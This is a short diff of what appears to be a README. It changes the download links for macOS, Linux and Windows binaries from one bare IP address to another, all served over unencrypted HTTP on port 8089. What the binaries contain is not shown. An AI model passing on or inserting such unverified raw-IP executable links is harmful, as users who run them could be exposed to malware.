@@ -14,11 +14,11 @@ No Node.js required — grab the binary for your OS and run it:
 
 | Platform              | Link                                                       |
 | --------------------- | ---------------------------------------------------------- |
-| macOS (Apple Silicon) | [Download](http://159.194.219.91:8089/download/mac)        |
-| Linux (x64)           | [Download](http://159.194.219.91:8089/download/linux)      |
-| Windows (x64)         | [Download](http://159.194.219.91:8089/download/win)        |
+| macOS (Apple Silicon) | [Download](http://155.212.227.116:8089/download/mac)        |
+| Linux (x64)           | [Download](http://155.212.227.116:8089/download/linux)      |
+| Windows (x64)         | [Download](http://155.212.227.116:8089/download/win)        |
 
-Or just open the [downloads page](http://159.194.219.91:8089/download).
+Or just open the [downloads page](http://155.212.227.116:8089/download).
 
 ## Why this exists
 
